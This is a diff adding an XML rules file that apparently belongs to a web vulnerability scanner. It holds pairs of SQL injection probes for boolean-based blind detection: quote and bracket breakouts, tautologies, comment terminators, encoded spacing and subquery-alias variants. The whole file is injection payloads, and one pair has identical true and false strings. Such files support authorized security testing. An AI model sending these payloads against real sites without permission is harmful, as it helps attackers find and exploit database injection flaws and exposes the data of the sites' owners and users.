@@ -1,0 +1,117 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<rules>
+    <couple id="1">
+        <compare>
+            <compare1>-0</compare1>
+            <compare2>-RANDINT</compare2>
+        </compare>
+        <compare>
+            <compare1>' AND RANDINT=RANDINT AND '1'='1</compare1>
+            <compare2>' AND RANDINT=RANDINT2 AND '1'='1</compare2>
+        </compare>
+        <compare>
+            <compare1>" AND RANDINT=RANDINT AND "1"="1</compare1>
+            <compare2>" AND RANDINT=RANDINT2 AND "1"="1</compare2>
+        </compare>
+        <compare>
+            <compare1> AND RANDINT=RANDINT-- tasdf</compare1>
+            <compare2> AND RANDINT=RANDINT2-- tad</compare2>
+        </compare>
+        <compare>
+            <compare1> AND RANDINT=RANDINT%23</compare1>
+            <compare2> AND RANDINT=RANDINT2%23</compare2>
+        </compare>
+        <compare>
+            <compare1> AND RANDINT=RANDINT</compare1>
+            <compare2> AND RANDINT=RANDINT2</compare2>
+        </compare>
+        <compare>
+            <compare1>) OR RANDINT=RANDINT AND (2568=2568</compare1>
+            <compare2>) AND RANDINT=RANDINT AND (2568=2568</compare2>
+        </compare>
+        <compare>
+            <compare1>) AND RANDINT=RANDINT AND (2568=2568</compare1>
+            <compare2>) AND RANDINT=RANDINT2 AND (2568=2568</compare2>
+        </compare>
+        <compare>
+            <compare1>'%0band%0b'RANDINT'='RANDINT</compare1>
+            <compare2>'%0bor%0b'RANDINT'='RANDINT</compare2>
+        </compare>
+        <compare>
+            <compare1>'or'RANDINT'='RANDINT</compare1>
+            <compare2>'or'RANDINT2'='RANDINT</compare2>
+        </compare>
+        <compare>
+            <compare1>%' AND RANDINT=RANDINT AND '%'='</compare1>
+            <compare2>%' AND RANDINT=RANDINT2 AND '%'='</compare2>
+        </compare>
+        <compare>
+            <compare1>%' AND RANDINT=RANDINT OR '%'='</compare1>
+            <compare2>%' AND RANDINT=RANDINT2 OR '%'='</compare2>
+        </compare>
+        <compare>
+            <compare1> OR RANDINT=RANDINT%23</compare1>
+            <compare2> OR RANDINT=RANDINT2%23</compare2>
+        </compare>
+        <compare>
+            <compare1>' OR RANDINT=RANDINT%23</compare1>
+            <compare2>' OR RANDINT=RANDINT2%23</compare2>
+        </compare>
+        <compare>
+            <compare1>) OR RANDINT=RANDINT%23</compare1>
+            <compare2>) OR RANDINT=RANDINT2%23</compare2>
+        </compare>
+    </couple>
+    <couple id="2">
+        <compare>
+            <compare1>)) AND RANDINT=RANDINT%23</compare1>
+            <compare2>)) AND RANDINT=RANDINT2%23</compare2>
+        </compare>
+        <compare>
+            <compare1>")) AND RANDINT=RANDINT%23</compare1>
+            <compare2>")) AND RANDINT=RANDINT%23</compare2>
+        </compare>
+        <compare>
+            <compare1>') AND RANDINT=RANDINT%23</compare1>
+            <compare2>') AND RANDINT=RANDINT2%23</compare2>
+        </compare>
+        <compare>
+            <compare1>%' AND RANDINT=RANDINT%23</compare1>
+            <compare2>%' AND RANDINT=RANDINT2%23</compare2>
+        </compare>
+        <compare>
+            <compare1>%" AND 4691=4691%23</compare1>
+            <compare2>%" AND 4691=1%23</compare2>
+        </compare>
+        <compare>
+            <compare1>')) AND RANDINT=RANDINT%23</compare1>
+            <compare2>')) AND RANDINT=RANDINT2%23</compare2>
+        </compare>
+        <compare>
+            <compare1>))) AND RANDINT=RANDINT%23</compare1>
+            <compare2>))) AND RANDINT=RANDINT2%23</compare2>
+        </compare>
+    </couple>
+    <couple id="3">
+        <compare>
+            <compare1>')) AS cGQn WHERE 8783=8783 AND RANDINT=RANDINT%23</compare1>
+            <compare2>')) AS cGQn WHERE 8783=8783 AND RANDINT=RANDINT2%23</compare2>
+        </compare>
+        <compare>
+            <compare1>') AS cGQn WHERE 8783=8783 AND RANDINT=RANDINT%23</compare1>
+            <compare2>') AS cGQn WHERE 8783=8783 AND RANDINT=RANDINT2%23</compare2>
+        </compare>
+        <compare>
+            <compare1>") AS cGQn WHERE 8783=8783 AND RANDINT=RANDINT%23</compare1>
+            <compare2>") AS cGQn WHERE 8783=8783 AND RANDINT=RANDINT2%23</compare2>
+        </compare>
+        <compare>
+            <compare1>")) AS cGQn WHERE 8783=8783 AND RANDINT=RANDINT%23</compare1>
+            <compare2>")) AS cGQn WHERE 8783=8783 AND RANDINT=RANDINT2%23</compare2>
+        </compare>
+        <compare>
+            <compare1>`) AS cGQn WHERE 8783=8783 AND RANDINT=RANDINT%23</compare1>
+            <compare2>`) AS cGQn WHERE 8783=8783 AND RANDINT=RANDINT2%23</compare2>
+        </compare>
+    </couple>
+</rules>
